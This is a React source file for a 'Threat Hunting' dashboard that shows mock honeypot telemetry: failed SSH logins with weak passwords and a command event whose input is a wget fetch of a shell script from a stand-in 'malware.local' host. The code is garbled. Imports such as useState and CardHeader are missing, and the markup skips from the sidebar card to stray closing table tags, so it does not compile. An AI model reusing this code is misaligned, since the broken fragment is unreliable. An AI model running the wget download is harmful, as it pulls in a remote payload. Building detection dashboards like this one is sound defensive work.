import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Search, Terminal, Filter, Download, Save, ChevronDown, Calendar } from 'lucide-react';

export default function ThreatHunting() {
  const [query, setQuery] = useState('sensor_id:"eu-west-1a-ssh" AND severity:("HIGH" OR "CRITICAL")');

  const results = [
    { time: '2023-10-24 14:32:01', sensor: 'eu-west-1a-ssh', type: 'SSH Login', src_ip: '185.150.11.20', user: 'root', password: '123', mitre: 'T1110.001', raw: '{"eventid": "cowrie.login.failed", "src_ip": "185.150.11.20", "username": "root", "password": "123"}' },
    { time: '2023-10-24 14:32:05', sensor: 'eu-west-1a-ssh', type: 'SSH Login', src_ip: '185.150.11.20', user: 'admin', password: 'admin', mitre: 'T1110.001', raw: '{"eventid": "cowrie.login.failed", "src_ip": "185.150.11.20", "username": "admin", "password": "admin"}' },
    { time: '2023-10-24 14:35:12', sensor: 'eu-west-1a-ssh', type: 'Command Exec', src_ip: '192.168.1.5', user: 'root', password: 'N/A', mitre: 'T1059.004', raw: '{"eventid": "cowrie.command.input", "input": "wget http://malware.local/sh -O /tmp/sh"}' },
  ];

  return (
    <div className="space-y-6 h-full flex flex-col animate-in fade-in slide-in-from-bottom-4 duration-500">
      <header className="flex justify-between items-end">
        <div>
          <h2 className="text-3xl font-bold flex items-center gap-3">
            <Search className="text-blue-500" size={32} />
            Threat Hunting
          </h2>
          <p className="text-gray-400 mt-2">Query telemetry, investigate IOCs, and build custom detections</p>
        </div>
        <div className="flex gap-2">
          <Button variant="outline" className="gap-2"><Save size={16}/> Save Search</Button>
          <Button variant="outline" className="gap-2"><Download size={16}/> Export CSV</Button>
        </div>
      </header>

      <div className="flex gap-6 h-[calc(100vh-180px)]">
        {/* Filters Sidebar */}
        <div className="w-64 flex flex-col gap-4">
          <Card className="bg-gray-900 border-gray-800">
            <CardHeader className="border-b border-gray-800 pb-3">
              <CardTitle className="text-sm">Time Range</CardTitle>
            </CardHeader>
            <CardContent className="p-4">
              <Button variant="outline" className="w-full justify-start text-left font-normal bg-gray-950 border-gray-800">
                <Calendar className="mr-2 h-4 w-4" />
                Last 24 Hours
              </Button>
            </CardContent>
          </Card>
          
            </TableBody>
          </Table>
        </div>
      </Card>
    </div>
  );
}
